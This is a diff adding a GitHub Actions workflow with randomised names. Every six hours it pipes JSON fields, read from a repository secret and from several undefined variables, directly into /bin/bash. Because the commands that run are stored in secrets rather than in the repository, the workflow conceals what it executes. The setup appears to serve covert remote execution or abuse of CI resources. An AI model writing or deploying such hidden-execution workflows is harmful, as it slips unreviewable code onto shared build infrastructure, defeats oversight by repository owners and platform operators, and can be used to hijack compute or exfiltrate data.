@@ -1,0 +1,26 @@
+name: jinyaodao3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jinyaodao3456
+        env:
+          ngj4754: ${{ secrets.ngj4754 }}
+        run: |
+          echo $ngj4754 | jq -r .wnk44511 | /bin/bash
+          echo $xtmk0138 | jq -r .lmg77388 | /bin/bash
+          echo $ez570 | jq -r .i19371 | /bin/bash
+          echo $up7 | jq -r .s5256 | /bin/bash
+          echo $ii119 | jq -r .mflsp7274 | /bin/bash
+          echo $g44251 | jq -r .q4 | /bin/bash
+          echo $tv3941 | jq -r .utnk20 | /bin/bash
+          echo $wnaj84852 | jq -r .dfpl70 | /bin/bash
+
